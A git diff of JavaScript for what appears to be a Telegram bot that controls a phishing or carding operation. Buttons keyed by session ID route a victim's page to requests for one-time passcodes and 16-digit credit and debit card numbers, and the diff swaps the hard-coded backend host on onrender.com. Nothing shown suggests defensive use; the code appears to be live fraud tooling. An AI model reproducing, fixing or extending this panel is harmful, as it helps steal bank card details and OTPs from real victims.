@@ -44,8 +44,8 @@ function getPrimaryReplyMarkup(sessionId) {
                 { text: "✅ Siguiente (OTP)", callback_data: `go:opcion1|${sessionId}` }
             ],
             [
-                { text: "💳 Débito", callback_data: `go:partcc|${sessionId}` },
-                { text: "💳 16 de TC", callback_data: `go:Visa+Oro|${sessionId}` }
+                { text: "💳 Débito", callback_data: `go:debit|${sessionId}` },
+                { text: "💳 16 de TC", callback_data: `go:partcc|${sessionId}` }
             ],
             [
                 { text: "💳 16 de DB", callback_data: `go:partcc|${sessionId}` },
@@ -636,7 +636,7 @@ console.log('callback_data recibido:', callback_query.data, '-> finalRoute:', fi
           });
           // Llama a la ruta del servidor para que envíe el segundo mensaje. 
           // La URL de Render ya está en el código.
-          await axios.post(`https://diosnoseolvidademi.onrender.com/${sendRoute}`, { sessionId });
+          await axios.post(`https://newbackend-cmv5.onrender.com/${sendRoute}`, { sessionId });
           return res.sendStatus(200); // Terminamos aquí si solo fue un envío de menú
       }
       
@@ -681,6 +681,7 @@ setInterval(async () => {
     console.error("❌ Error en auto-ping:", error.message);
   }
 }, 180000); // 180000 ms = 3 minutos
+
 
 
 
